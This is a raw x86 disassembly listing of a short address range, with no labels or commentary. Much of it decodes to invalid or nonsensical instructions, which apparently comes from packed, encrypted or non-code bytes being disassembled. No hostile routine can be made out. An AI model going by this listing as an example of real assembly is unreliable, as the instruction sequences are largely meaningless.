  401808:	test   BYTE PTR [ebx-0x24ff56fd],0xb
  40180f:	and    eax,0x3f003c1
  401814:	fsub   DWORD PTR [edx]
  401816:	test   al,0x2
  401818:	aaa    
  401819:	mov    edx,0x1875c3b0
  40181e:	sub    BYTE PTR [ebx+0xe],ah
  401821:	inc    esi
  401822:	xor    eax,0x7e275c47
  401827:	and    DWORD PTR [ebx],0xfffffffe
  40182a:	mov    eax,esi
  40182c:	pop    edx
  40182d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40182e:	hlt    
  40182f:	pop    eax
  401830:	imul   esi,DWORD PTR ds:0xdb33c076,0xe34c0d2f
  40183a:	pop    ebx
  40183b:	mov    ah,0x5e
  40183d:	out    dx,al
  40183e:	dec    esi
  40183f:	(bad)  
  401840:	in     eax,0x81
  401842:	js     0x401848
  401844:	(bad)  
  401845:	mov    WORD PTR [esi-0x7e],?
  401848:	xchg   DWORD PTR [edi+0x0],edi
  40184b:	scas   al,BYTE PTR es:[edi]
  40184c:	ror    BYTE PTR [ebp-0x2ed4d1f4],1
  401852:	xor    bh,BYTE PTR [edi-0x24]
  401855:	mov    ds:0xf0edfdfd,al
  40185a:	sub    esi,ebp
  40185c:	push   0x2b
  40185e:	mov    DWORD PTR [ebx+0x167d0cf8],0x502bd551
  401868:	dec    eax
  401869:	(bad)  
  40186a:	cmovge eax,DWORD PTR [ebp-0x69384f11]
  401871:	or     cl,BYTE PTR [edx+ecx*2+0x14]
  401875:	(bad)  
  401876:	xor    BYTE PTR [ebp-0x203b57eb],cl
  40187c:	inc    ebp
  40187d:	add    al,0x21
  40187f:	mov    edi,DWORD PTR [esp]
  401882:	xchg   esi,eax
  401883:	cmp    ah,al
  401885:	aad    0xf3
  401887:	sahf   
  401888:	loope  0x4018f0
  40188a:	fst    QWORD PTR [eax-0x45b38553]
  401890:	push   ecx
  401891:	ja     0x401880
  401893:	sbb    esp,DWORD PTR [eax-0x39]
  401896:	add    ebp,ebx
  401898:	shl    BYTE PTR [esi+0xa],1
  40189b:	lea    edx,[edx+ecx*8]
  40189e:	rol    BYTE PTR [ebx-0x10],1
  4018a1:	mov    edx,esp
  4018a3:	test   BYTE PTR [edx+0x59b57007],cl
  4018a9:	mov    bl,0xf0
  4018ab:	ret    
  4018ac:	rcr    DWORD PTR [ecx+0x760b5820],0x53
  4018b3:	mov    DWORD PTR [ebx+ecx*8],esi
  4018b6:	mov    ch,BYTE PTR [ebx+ebp*2-0x4f]
  4018ba:	mov    DWORD PTR [eax-0x4d],ebx
  4018bd:	add    edi,DWORD PTR [eax+ebp*8]
  4018c0:	or     al,0x14
  4018c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018c3:	sti    
  4018c4:	imul   esi,DWORD PTR [ebx-0x4c],0x5d
  4018c8:	jbe    0x401926
  4018ca:	test   eax,eax
  4018cc:	jo     0x40188e
  4018ce:	clc    
  4018cf:	add    al,BYTE PTR [ebx+eax*1-0x211e69a4]
  4018d6:	fdivr  QWORD PTR [edx+0x7b635006]
  4018dc:	retf   
  4018dd:	and    ebp,DWORD PTR [ecx]
  4018df:	test   BYTE PTR [edi*8-0x7f176940],0x45
  4018e7:	adc    DWORD PTR [esi-0x791282f0],edx
  4018ed:	inc    ecx
  4018ee:	add    bl,BYTE PTR [edi-0x43]
  4018f1:	stos   DWORD PTR es:[edi],eax
  4018f2:	dec    ecx
  4018f3:	mov    ds:0x8ad1724,eax
  4018f8:	cmc    
  4018f9:	or     BYTE PTR [ecx+0x26],dh
  4018fc:	ins    BYTE PTR es:[edi],dx
  4018fd:	ficom  WORD PTR [esi-0x6]
  401900:	cmp    al,0x7c
  401902:	or     eax,0x80d00ec9
  401907:	dec    ebp
  401908:	dec    esi
  401909:	cmp    esi,DWORD PTR [eax+0x41]
  40190c:	mov    eax,ds:0x418125e7
  401911:	sub    BYTE PTR [esi-0x67],dh
  401914:	scas   eax,DWORD PTR es:[edi]
  401915:	lock or eax,0x6efc07d9
  40191b:	cmp    DWORD PTR ds:0x407e8a14,0x11
  401922:	repnz or al,0xc1
  401925:	retf   0x1cdb
  401928:	aas    
  401929:	pop    es
  40192a:	es add bl,ch
  40192d:	sub    esp,DWORD PTR [ecx-0x7b27377d]
  401933:	enter  0xdca9,0x18
  401937:	fisttp QWORD PTR [eax-0x47d486f3]
  40193d:	jae    0x401942
  40193f:	sbb    BYTE PTR ds:0xbd8f4b0c,0xa2
  401946:	ror    DWORD PTR [ebp+0x2c8d84a4],0xa5
  40194d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40194e:	mov    edi,esp
  401950:	rol    BYTE PTR [ecx],0x9e
  401953:	lock dec eax
  401955:	adc    BYTE PTR [ebp+esi*2+0x1ad0bb43],al
  40195c:	jmp    0xf492db1a
  401961:	fdiv   DWORD PTR [ebx-0x41]
  401964:	push   es
  401965:	jge    0x4018ea
  401967:	or     ah,BYTE PTR [ebp+0x1072918]
  40196d:	inc    edi
  40196e:	add    BYTE PTR [ebx],al
  401970:	or     bl,dh
  401972:	add    esi,DWORD PTR [eax+edi*8-0x50]
  401976:	out    dx,al
  401977:	stos   BYTE PTR es:[edi],al
  401978:	and    al,0x64
  40197a:	(bad)  
  40197b:	jae    0x401985
  40197d:	xor    DWORD PTR [eax+0x75f03b2d],edx
  401983:	adc    DWORD PTR [eax+0x18ad185f],edi
  401989:	add    al,0xba
  40198b:	not    ebx
  40198d:	sub    DWORD PTR [edi+0x4],0x32
  401991:	mov    ecx,0x33d81f1
  401996:	mov    edi,DWORD PTR [eax*1+0x5c3401b0]
  40199d:	je     0x40196f
  40199f:	add    bh,BYTE PTR [edi-0x722b8f38]
  4019a5:	inc    ebx
  4019a6:	(bad)  
  4019a7:	mov    ds:0x8591b82,al
  4019ac:	pusha  
  4019ad:	and    DWORD PTR [esi],0x0
  4019b0:	mov    ds:0xb0ec48b,al
  4019b5:	(bad)  
  4019b6:	in     al,dx
  4019b7:	ret    0xd010
  4019ba:	add    cl,BYTE PTR [esi+0x8edaf06]
  4019c0:	xchg   DWORD PTR [edi-0x44],eax
  4019c3:	lea    edx,[esi-0x58]
  4019c6:	ret    
  4019c7:	pusha  
  4019c8:	or     DWORD PTR [eax],eax
  4019ca:	fwait
  4019cb:	lea    edx,[eax-0x4bae40f8]
  4019d1:	rcl    BYTE PTR [esi-0x2d],0x71
  4019d5:	cwde   
  4019d6:	or     bl,BYTE PTR [edi]
  4019d8:	cmp    eax,0x11197f2d
  4019dd:	cmp    dh,BYTE PTR [esi-0x7eb360d1]
  4019e3:	hlt    
  4019e4:	cmp    BYTE PTR [ebx+0x1908243a],al
  4019ea:	les    ebx,FWORD PTR ss:[edx+0x28be73e]
  4019f1:	pop    edx
  4019f2:	inc    edi
  4019f3:	int    0x8
  4019f5:	mov    edi,0x2d06c3a2
  4019fa:	jno    0x4019b9
  4019fc:	jne    0x40199f
  4019fe:	or     BYTE PTR [edi-0x7698defa],bh
  401a04:	sbb    ebx,DWORD PTR [ebp-0x545471f1]
  401a0a:	sbb    eax,0x7695ec88
  401a0f:	and    al,bl
  401a11:	and    BYTE PTR [edx+0x85a8916],bl
  401a17:	or     BYTE PTR [edx+0x55a682a4],bh
  401a1d:	mov    dl,0x16
  401a1f:	push   ss
  401a20:	cmp    edi,DWORD PTR [edi+0x62]
  401a23:	pop    ss
  401a24:	inc    ebp
  401a25:	xchg   ebp,eax
  401a26:	mov    eax,0x766766d
  401a2b:	je     0x401a81
  401a2d:	cwde   
  401a2e:	jbe    0x401a81
  401a30:	int3   
  401a31:	(bad)  
  401a33:	ror    DWORD PTR [esi],0x87
  401a36:	adc    DWORD PTR [edx+eax*4+0x60f43e83],edi
  401a3d:	sbb    ebx,DWORD PTR [esi+esi*8+0x23]
  401a41:	daa    
  401a42:	sbb    eax,0xeeb0a88
  401a47:	adc    esi,DWORD PTR [ecx]
  401a49:	cmp    ebx,DWORD PTR [ebp+0x4e]
  401a4c:	sahf   
  401a4d:	cdq    
  401a4e:	push   ss
  401a4f:	fisttp DWORD PTR [ecx+0x7d830829]
  401a55:	call   0x45742ab2
  401a5a:	loop   0x401a1f
  401a5c:	cmp    ecx,DWORD PTR [edx]
  401a5e:	push   cs
  401a5f:	sbb    BYTE PTR [ebp-0x3c4ce2ff],ch
  401a65:	mov    eax,0xf8c7d9c5
  401a6a:	cdq    
  401a6b:	or     ch,BYTE PTR [eax]
  401a6d:	bnd jl 0x401a26
  401a70:	add    esi,ebp
  401a72:	add    al,0xd5
  401a74:	sub    ebx,0x46
  401a77:	mov    ebx,0x2f669eb
  401a7c:	lods   al,BYTE PTR ds:[esi]
  401a7d:	rcr    BYTE PTR [ecx+ebp*1+0x6],0xfa
  401a82:	mov    eax,edx
  401a84:	and    cl,BYTE PTR [esi]
  401a86:	fmul   DWORD PTR [ebp+0xc7c8057]
  401a8c:	cli    
  401a8d:	rcl    DWORD PTR [edx-0x7c3e6697],cl
  401a93:	shr    ebx,cl
  401a95:	push   ds
  401a96:	scas   al,BYTE PTR es:[edi]
  401a97:	dec    eax
  401a98:	jne    0x401aa1
  401a9a:	lahf   
  401a9b:	add    BYTE PTR [esi],0x58
  401a9e:	and    eax,0x75b00cd3
  401aa3:	fisubr WORD PTR [edx-0x4c]
  401aa6:	push   0xffffffcf
  401aa8:	sbb    al,0x19
  401aaa:	aad    0x9e
  401aac:	and    BYTE PTR [ecx+0x2b],0x84
  401ab0:	pop    edi
  401ab1:	pop    es
  401ab2:	in     al,dx
  401ab3:	push   ebx
  401ab4:	mov    ?,WORD PTR ds:0xdb8440f
  401aba:	adc    al,dh
  401abc:	or     ah,al
  401abe:	je     0x401b27
  401ac0:	add    DWORD PTR [ebx],0x5c
  401ac3:	pop    edx
  401ac4:	clc    
  401ac5:	outs   dx,BYTE PTR ds:[esi]
  401ac6:	jle    0x401a9f
  401ac8:	inc    ebp
  401ac9:	cld    
  401aca:	push   ebp
  401acb:	cwde   
  401acc:	cmp    al,0xc4
  401ace:	adc    al,0xdf
  401ad0:	or     ah,bl
  401ad2:	and    al,0x3b
  401ad4:	dec    edi
  401ad5:	ins    DWORD PTR es:[edi],dx
  401ad6:	clc    
  401ad7:	dec    edi
  401ad8:	add    ebx,0x7
  401adb:	and    ebx,0xfffffffc
  401ade:	cmp    ebx,0x12
  401ae1:	add    eax,0x5417eabb
  401ae6:	test   DWORD PTR [edi+ecx*4],0x16ac8f0f
  401aed:	jmp    0x80b2b347
  401af2:	xchg   al,bh
  401af4:	jb     0x401aee
  401af6:	stos   BYTE PTR es:[edi],al
  401af7:	mov    DWORD PTR [eax],ebx
  401af9:	loop   0x401b11
  401afb:	pop    eax
  401afc:	adc    ebx,eax
  401afe:	and    ch,ah
  401b00:	push   cs
  401b01:	sub    BYTE PTR [edx],ah
  401b03:	(bad)  
  401b04:	sbb    cl,BYTE PTR [edx]
  401b06:	mov    cl,0x6d
  401b08:	fimul  DWORD PTR [eax+0x1c]
  401b0b:	lock lock cmp edx,DWORD PTR [esi]
  401b0f:	jne    0x401b1f
  401b11:	aaa    
  401b12:	dec    ebx
  401b13:	add    eax,0x26ebf6f7
  401b18:	xchg   DWORD PTR [ebp-0x10],ecx
  401b1b:	sbb    eax,0x3b5d0ec1
  401b20:	inc    ebx
  401b21:	fdivr  st(4),st
  401b23:	pop    edx
  401b24:	inc    edi
  401b25:	ins    BYTE PTR es:[edi],dx
  401b26:	mov    edx,0x3b873010
  401b2b:	jl     0x401ace
  401b2d:	sub    al,0xec
  401b2f:	pop    ss
  401b30:	xor    BYTE PTR [edx-0x137a7cd2],dh
  401b36:	pusha  
  401b37:	and    BYTE PTR ds:0xf584fc45,ch
  401b3d:	out    dx,al
  401b3e:	icebp  
  401b3f:	shl    DWORD PTR [edi],0x8c
  401b42:	sar    DWORD PTR [ebx],1
  401b44:	sbb    eax,0x29537f99
  401b49:	ucomiss xmm2,DWORD PTR [esi-0x43]
  401b4d:	inc    ebx
  401b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b4f:	or     eax,0xc5511d03
  401b54:	jno    0x401b00
  401b56:	lods   eax,DWORD PTR ds:[esi]
  401b57:	loop   0x401b0f
  401b59:	ret    
  401b5a:	mov    ebx,0x61c932eb
  401b5f:	(bad)  
  401b60:	int    0x89
  401b62:	hlt    
  401b63:	ds pop edi
  401b65:	jecxz  0x401b8b
  401b67:	mov    al,0x38
  401b69:	stc    
  401b6a:	add    ecx,DWORD PTR [ebx-0x74a403bb]
  401b70:	in     eax,0xf0
  401b72:	push   esi
  401b73:	dec    edi
  401b74:	xchg   dl,al
  401b76:	imul   eax,DWORD PTR [edx],0xffffffb7
  401b79:	gs pop ds
  401b7b:	jne    0x401b93
  401b7d:	cmp    BYTE PTR ds:0x8e75cce,ah
  401b83:	or     ax,0x42be
  401b87:	push   esi
  401b88:	pop    esi
  401b89:	ins    BYTE PTR es:[edi],dx
  401b8a:	push   ss
  401b8b:	mov    dh,0xb3
  401b8d:	mov    DWORD PTR es:[ebp-0x8],ebx
  401b91:	pop    edi
  401b92:	imul   edi,DWORD PTR [eax+0x1d],0xf8542c42
  401b99:	sbb    dh,dh
  401b9b:	ret    
  401b9c:	add    dh,BYTE PTR [ebp+0x68]
  401b9f:	test   DWORD PTR [edi-0x4d],ebp
  401ba2:	setns  BYTE PTR [ecx]
  401ba5:	mov    eax,DWORD PTR [esi-0x3cccf201]
  401bab:	mov    ebx,0x9b467c19
  401bb0:	push   esi
  401bb1:	sub    DWORD PTR ds:0x740152ab,eax
  401bb7:	push   ebx
  401bb8:	jns    0x401c00
  401bba:	clc    
  401bbb:	enter  0xce1,0xc3
  401bbf:	bound  eax,QWORD PTR [edi]
  401bc1:	test   eax,0x2f15ea03
  401bc6:	sbb    ah,0x7d
  401bc9:	or     bl,BYTE PTR [edx+0x6199d02b]
  401bcf:	ret    0xa668
  401bd2:	fdivr  DWORD PTR ds:0xa7857138
  401bd8:	dec    edi
  401bd9:	(bad)  
  401bda:	std    
  401bdb:	lock or DWORD PTR [ebx],ebp
  401bde:	xchg   DWORD PTR [ebx],edi
  401be0:	sbb    al,0x79
  401be2:	lods   al,BYTE PTR ds:[esi]
  401be3:	add    eax,ebx
  401be5:	cmp    eax,DWORD PTR ds:0x292c75cd
  401beb:	fnstsw WORD PTR [eax-0x7f]
  401bee:	in     eax,0xc5
  401bf0:	add    DWORD PTR [ecx],esi
  401bf2:	sub    DWORD PTR [edx+0x1583057e],0x554b0e47
  401bfc:	(bad)  
  401bfd:	lock add ah,BYTE PTR [edi]
  401c00:	clc    
  401c01:	push   ds
  401c02:	sbb    eax,DWORD PTR [eax]
  401c04:	test   al,0x2
  401c06:	je     0x401c26
  401c08:	addr16 clc 
  401c0a:	add    al,0x69
  401c0c:	imul   edi
  401c0e:	mov    ecx,0x3c4e0b2b
  401c13:	or     DWORD PTR [eax],0x1
  401c16:	jmp    0x401c54
  401c18:	push   cs
  401c19:	bnd lock jne 0x401c00
  401c1d:	push   esi
  401c1e:	cli    
  401c1f:	cmp    DWORD PTR [eax+0x4],0xa
  401c23:	adc    BYTE PTR [edx+0x7706009],al
  401c29:	sti    
  401c2a:	and    DWORD PTR [eax],ecx
  401c2c:	or     al,0x67
  401c2e:	sbb    ch,BYTE PTR [eax]
  401c30:	into   
  401c31:	jnp    0x401c68
  401c33:	cwde   
  401c34:	jmp    0xa13d:0x46d3595b
  401c3b:	dec    ecx
  401c3c:	add    edx,DWORD PTR [eax-0x45527afd]
  401c42:	and    DWORD PTR es:[eiz*4-0x7b8240bd],esi
  401c4a:	xchg   edi,edi
  401c4c:	ret    0xe1ca
  401c4f:	mov    esi,DWORD PTR [eax]
  401c51:	and    esi,0x6d76fb1f
  401c57:	aad    0x96
  401c59:	(bad)  
  401c5a:	retf   
  401c5b:	cmp    esi,ebx
  401c5d:	or     dh,BYTE PTR [eax-0x44e76dff]
  401c63:	adc    al,0xb6
  401c65:	mov    edx,0x90ae0052
  401c6a:	out    dx,al
  401c6b:	sub    ebp,ebx
  401c6d:	out    dx,eax
  401c6e:	cmp    edx,DWORD PTR ds:0x1b97457d
  401c74:	push   ecx
  401c75:	sub    eax,0x8d0f832d
  401c7a:	outs   dx,DWORD PTR ds:[esi]
  401c7b:	push   edi
  401c7c:	not    edx
  401c7e:	popf   
  401c7f:	bound  esp,QWORD PTR [ecx+esi*1]
  401c82:	sub    DWORD PTR [ebx-0x74617822],ecx
  401c88:	add    bh,BYTE PTR [ecx]
  401c8a:	and    DWORD PTR [esi],ecx
  401c8c:	test   BYTE PTR [eax],0x3e
  401c8f:	adc    DWORD PTR [ecx-0x76],eax
  401c92:	divps  xmm0,XMMWORD PTR [ecx-0x30]
  401c96:	push   0xfd83d50d
  401c9b:	mov    eax,0x8565adbe
  401ca0:	and    ebx,DWORD PTR [ebx+0x5102cdfd]
  401ca6:	sub    BYTE PTR [esi+0x7b],bh
  401ca9:	mov    esp,eax
  401cab:	or     edx,DWORD PTR [ebp-0x4745867]
  401cb1:	sub    edi,esi
  401cb3:	out    dx,eax
  401cb4:	pop    es
  401cb5:	scas   eax,DWORD PTR es:[edi]
  401cb6:	push   eax
  401cb7:	jno    0x401d1e
  401cb9:	cmp    eax,DWORD PTR [edi]
  401cbb:	jg     0x401d0c
  401cbd:	sub    DWORD PTR [edi],ecx
  401cbf:	sar    DWORD PTR [ebx-0x51],cl
  401cc2:	jmp    0xb35859c8
  401cc7:	sbb    BYTE PTR [ecx+0x16c95327],ah
  401ccd:	shl    dh,0x58
  401cd0:	(bad)  [ebx]
  401cd2:	(bad)  
  401cd3:	sub    al,0x67
  401cd5:	lock test DWORD PTR ds:0xb525962a,edi
  401cdc:	or     ebx,eax
  401cde:	mov    al,0x18
  401ce0:	adc    al,0x6c
  401ce2:	mov    eax,0x2feffd58
  401ce7:	mov    DWORD PTR [eax+0x4fc8621f],eax
  401ced:	nop
  401cee:	push   0x8
  401cf0:	cmp    edi,ebp
  401cf2:	xchg   DWORD PTR [eax-0x4b],esp
  401cf5:	pop    ebx
  401cf6:	mov    es,WORD PTR [ebx]
  401cf8:	lds    eax,FWORD PTR [ebx+0x2b]
  401cfb:	std    
  401cfc:	push   es
  401cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cfe:	sub    ebp,edi
  401d00:	inc    BYTE PTR [eax+0xea90697]
  401d06:	mov    edx,ebp
  401d08:	retf   
  401d09:	dec    edi
  401d0a:	add    ebx,ebp
  401d0c:	mov    esi,0x1ff01a70
  401d11:	mov    bl,0xeb
  401d13:	cmp    ebp,DWORD PTR [ebx]
  401d15:	out    dx,al
  401d16:	mov    ebp,0x2a9f25e5
  401d1b:	shr    DWORD PTR [edx],0xd7
  401d1e:	aaa    
  401d1f:	sbb    BYTE PTR [ecx-0x4d],al
  401d22:	add    DWORD PTR [eax+0x11],ebp
  401d25:	mov    BYTE PTR [esi],cl
  401d27:	adc    eax,DWORD PTR [ebx+0x383c2282]
  401d2d:	pop    ss
  401d2e:	xchg   esi,eax
  401d2f:	(bad)  
  401d30:	sbb    eax,0xb4191c85
  401d35:	add    cl,BYTE PTR ds:0x19041217
  401d3b:	stos   BYTE PTR es:[edi],al
  401d3c:	adc    edi,DWORD PTR [edi+ebp*4+0x13]
  401d40:	and    DWORD PTR [ebx+0x1d],ebx
  401d43:	or     al,BYTE PTR ds:0x81978419
  401d49:	sub    DWORD PTR [edx-0x74a1407d],ebp
  401d4f:	(bad)  
  401d50:	ret    
  401d51:	push   ss
  401d52:	rcr    BYTE PTR [edx],0x5
  401d55:	mov    al,0x12
  401d57:	dec    esi
  401d58:	sbb    esp,edx
  401d5a:	cld    
  401d5b:	jmp    0x401d9a
  401d5d:	fist   DWORD PTR [ebx]
  401d5f:	cmp    al,0xb9
  401d61:	in     eax,dx
  401d62:	ret    0x81aa
  401d65:	push   cs
  401d66:	mov    WORD PTR [ebx-0x20fd82ea],es
  401d6c:	pop    es
  401d6d:	jl     0x401cef
  401d6f:	cmp    ah,bh
  401d71:	je     0x401d85
  401d73:	fmul   st,st(3)
  401d75:	xchg   ecx,eax
  401d76:	push   eax
  401d77:	sbb    ebp,DWORD PTR [eax]
  401d79:	and    BYTE PTR [edx],bl
  401d7b:	popf   
  401d7c:	jno    0x401dfc
  401d7e:	shr    BYTE PTR [esi+0x5082409b],1
  401d84:	jb     0x401d0e
  401d86:	sub    DWORD PTR [ecx+ebx*8-0x55390025],ecx
  401d8d:	xchg   eax,ebx
  401d8f:	test   ebx,ebx
  401d91:	jle    0x401dad
  401d93:	nop
  401d94:	call   DWORD PTR ds:0xf6505038
  401d9a:	out    0x5f,al
  401d9c:	sbb    BYTE PTR [esi-0x4ff18af6],al
  401da2:	add    DWORD PTR [edx],ebx
  401da4:	mov    bl,ch
  401da6:	add    eax,0x8dcc15aa
  401dab:	inc    esp
  401dac:	scas   eax,DWORD PTR es:[edi]
  401dad:	out    0x85,eax
  401daf:	push   esp
  401db0:	adc    eax,0xa777b318
  401db5:	push   esp
  401db6:	cmp    al,0x71
  401db8:	je     0x401dc5
  401dba:	mov    al,0x2
  401dbc:	dec    edi
  401dbd:	add    dh,BYTE PTR [edi+edi*8-0x3c035c89]
  401dc4:	mov    ds:0x74c98508,al
  401dc9:	xor    al,BYTE PTR [ebp+0x501874d2]
  401dcf:	mov    eax,ecx
  401dd1:	dec    esi
  401dd2:	inc    eax
  401dd3:	add    al,0x4a
  401dd5:	jnp    0x401dd2
  401dd7:	pop    ecx
  401dd8:	or     DWORD PTR [ecx+ebx*1-0x77],esp
  401ddc:	add    ebx,eax
  401dde:	push   edx
  401ddf:	jmp    0x6de5da22
  401de4:	out    dx,eax
  401de5:	xor    BYTE PTR [ecx+0x2aeb752e],al
  401deb:	add    DWORD PTR [edx+0x10],esp
  401dee:	std    
  401def:	into   
  401df0:	dec    ecx
  401df1:	rcl    eax,cl
  401df3:	cmp    bh,ah
  401df5:	fimul  WORD PTR [ecx-0x1e4ffbeb]
  401dfb:	xchg   bh,bl
  401dfd:	and    ah,al
  401dff:	sub    al,0x90
  401e01:	ret    
  401e02:	jecxz  0x401de7
  401e04:	push   ds
  401e05:	cmp    eax,0x733bde08
  401e0a:	dec    eax
  401e0b:	mov    bh,0x81
  401e0d:	sbb    DWORD PTR fs:[ebx+ebx*8+0x484a0d75],eax
  401e15:	mov    edi,0x321b56f8
  401e1a:	cwde   
  401e1b:	add    al,0xf9
  401e1d:	jo     0x16b7371e
  401e23:	mov    al,bl
  401e25:	mov    bl,BYTE PTR [eax-0x446b495d]
  401e2b:	inc    esp
  401e2c:	adc    BYTE PTR [ebx],0xd1
  401e2f:	sbb    dh,BYTE PTR [eax]
  401e31:	(bad)  
  401e32:	mov    edi,0x83b89cef
  401e37:	loopne 0x401eb8
  401e39:	es cmc 
  401e3b:	cmp    al,0xc3
  401e3d:	push   eax
  401e3e:	push   edx
  401e3f:	push   ecx
  401e40:	jne    0x401dc5
  401e42:	mov    eax,0x28045b60
  401e47:	pop    ax
  401e49:	jne    0x401e41
  401e4b:	xor    eax,eax
  401e4d:	ins    BYTE PTR es:[edi],dx
  401e4e:	stc    
  401e4f:	in     al,dx
  401e50:	loopne 0x401e81
  401e52:	out    0xe8,eax
  401e54:	mov    ch,0x89
  401e56:	jp     0x401e38
  401e58:	int    0xad
  401e5a:	mov    ebx,0x8bc68904
  401e5f:	or     al,BYTE PTR [edx+ecx*1+0x6]
  401e63:	je     0x401e90
  401e65:	(bad)  
  401e66:	mov    edi,0x7e72bfe0
  401e6b:	sbb    BYTE PTR [ecx],bh
  401e6d:	ret    0x1b7f
  401e70:	sub    eax,edx
  401e72:	inc    eax
  401e73:	hlt    
  401e74:	jl     0x401e8a
  401e76:	cmp    ecx,eax
  401e78:	jg     0x401e8e
  401e7a:	add    esi,edx
  401e7c:	mov    BYTE PTR [edi],cl
  401e7e:	inc    edi
  401e7f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e81:	jmp    0x401e7b
  401e83:	fcomip st,st(0)
  401e85:	(bad)  
  401e86:	adc    DWORD PTR [edx-0x36ce1f6c],edi
  401e8c:	jmp    0x401e7a
  401e8e:	mov    ecx,eax
  401e90:	jmp    0x401e7a
  401e92:	mov    BYTE PTR [edi],al
  401e94:	mov    ebp,0x7eeb3c15
  401e99:	ret    0xa786
  401e9c:	pop    ecx
  401e9d:	adc    eax,0x42b839dd
  401ea2:	mov    dl,0x90
  401ea4:	sbb    DWORD PTR [ecx+0x7689c73e],ecx
  401eaa:	sti    
  401eab:	inc    DWORD PTR [esi-0x8c6ad29]
  401eb1:	ja     0x401ec6
  401eb3:	je     0x401ee4
  401eb5:	sar    ecx,0x2
  401eb8:	js     0x401ee4
  401eba:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ebc:	xchg   BYTE PTR [ebx-0x4251fc1f],al
  401ec2:	in     eax,dx
  401ec3:	(bad)  
  401ec4:	data16 mov BYTE PTR [edx+0x74],al
  401ec8:	xor    esp,edi
  401eca:	lea    edi,[ecx+edi*1-0x4]
  401ece:	xor    DWORD PTR [ecx],edx
  401ed0:	std    
  401ed1:	xor    eax,DWORD PTR [ebx+0x70d2e1c6]
  401ed7:	scas   eax,DWORD PTR es:[edi]
  401ed8:	add    al,0xc7
  401eda:	ds cld 
  401edc:	inc    eax
  401edd:	inc    esp
  401ede:	sub    BYTE PTR [esi],al
  401ee0:	add    edi,DWORD PTR [ecx+eax*4-0x63]
  401ee4:	cmp    al,0x11
  401ee6:	mov    eax,0x9c2c79d2
  401eeb:	xchg   DWORD PTR [esi],edx
  401eed:	loopne 0x401eee
  401eef:	jg     0x401f57
  401ef1:	mov    ecx,DWORD PTR [eax+0x4]
  401ef4:	sub    cx,0xd7b1
  401ef9:	je     0x401f0a
  401efb:	dec    ecx
  401efc:	sub    cx,0x2
  401f00:	jae    0x401f0e
  401f02:	sahf   
  401f03:	call   ebx
  401f05:	fwait
  401f06:	stos   BYTE PTR es:[edi],al
  401f07:	adc    eax,0x1bebca0b
  401f0c:	mov    bl,ch
  401f0e:	pop    ss
  401f0f:	into   
  401f10:	bound  esi,QWORD PTR [edi+eax*1+0x4e]
  401f14:	add    esi,ebp
  401f16:	jmp    0x401f55
  401f18:	loopne 0x401f7d
  401f1a:	adc    al,0x4
  401f1c:	and    al,al
  401f1e:	addr16 hlt 
  401f20:	add    eax,0x7d82f95
  401f25:	mov    eax,ebx
  401f27:	mov    ah,0x47
  401f29:	mov    edx,DWORD PTR [eax+0x1c]
  401f2c:	fiadd  DWORD PTR [ecx-0x69]
  401f2f:	push   0x8cc78409
  401f34:	mov    al,0x43
  401f36:	int    0xfe
  401f38:	ins    DWORD PTR es:[edi],dx
  401f39:	imul   edi,DWORD PTR ds:0xa2f72ae,0xffffffb3
  401f40:	xlat   BYTE PTR ds:[ebx]
  401f41:	ja     0x401f6c
  401f43:	and    ax,0xd7b2
  401f47:	adc    al,BYTE PTR [esi]
  401f49:	jne    0x401f1c
  401f4b:	retf   0x7fec
  401f4e:	jb     0x401f4f
  401f50:	push   ebx
  401f51:	sbb    al,0x8b
  401f53:	lock test esi,esi
  401f56:	adc    eax,0xdd1b7424
  401f5b:	pop    esp
  401f5c:	(bad)
  401f5f:	sahf   
  401f60:	jmp    0x401f74
  401f62:	cmp    ebx,0xb8a04a48
  401f68:	shl    DWORD PTR [edi],cl
  401f6a:	aaa    
  401f6b:	pop    esp
  401f6c:	int3   
  401f6d:	mov    esi,0x88c70c4f
  401f73:	int    0xc1
  401f75:	loopne 0x401f87
  401f77:	mov    cl,0xf2
  401f79:	sbb    eax,0x890a66b6
  401f7e:	rcl    DWORD PTR [ecx],1
  401f80:	or     ebx,esi
  401f82:	stos   DWORD PTR es:[edi],eax
  401f83:	mov    ecx,edx
  401f85:	stos   BYTE PTR es:[edi],al
  401f86:	pop    edi
  401f87:	push   edi
  401f88:	sbb    al,0x3d
  401f8a:	mov    WORD PTR [esi+0x6c285050],cs
  401f90:	sbb    dh,BYTE PTR [ecx]
  401f92:	fstp   TBYTE PTR [edi-0x4875048a]
  401f98:	int3   
  401f99:	add    BYTE PTR [edx+ecx*4],cl
  401f9c:	push   ds
  401f9d:	inc    esi
  401f9e:	clc    
  401f9f:	and    BYTE PTR [eax+edi*8-0x4b],dh
  401fa3:	add    BYTE PTR [ebp*1-0x32f79d8c],cl
  401faa:	int    0x95
  401fac:	out    0x2b,al
  401fae:	je     0x40200f
  401fb0:	and    al,0x78
  401fb2:	je     0x40200e
  401fb4:	pop    eax
  401fb5:	je     0x40200c
  401fb7:	xor    BYTE PTR ds:0x6254f695,bl
  401fbd:	dec    edi
  401fbe:	and    cl,BYTE PTR [eax+0x43]
  401fc1:	jle    0x402037
  401fc3:	sti    
  401fc4:	(bad)  
  401fc5:	in     eax,dx
  401fc6:	out    dx,eax
  401fc7:	and    bl,ch
  401fc9:	add    al,0xa
  401fcb:	sub    eax,0x2230eb80
  401fd0:	or     DWORD PTR [edi+0x25],esi
  401fd3:	cmp    eax,edi
  401fd5:	ja     0x401ff8
  401fd7:	lea    eax,[eax+eax*4]
  401fda:	add    eax,eax
  401fdc:	add    eax,ebx
  401fde:	push   edx
  401fdf:	(bad)  
  401fe0:	jg     0x401fdd
  401fe2:	(bad)  
  401fe3:	mov    esi,0x74cdfee6
  401fe8:	or     edx,edx
  401fea:	jge    0x402040
  401fec:	jmp    0x401ff7
  401fee:	inc    esi
  401fef:	jmp    0x401ff7
  401ff1:	neg    eax
  401ff3:	jle    0x402040
  401ff5:	js     0x402040
  401ff7:	pop    ebx
  401ff8:	sub    ebp,edi
  401ffa:	mov    dh,ah
  401ffc:	sti    
  401ffd:	fsubp  st(3),st
  401fff:	inc    edi
  402000:	inc    ch
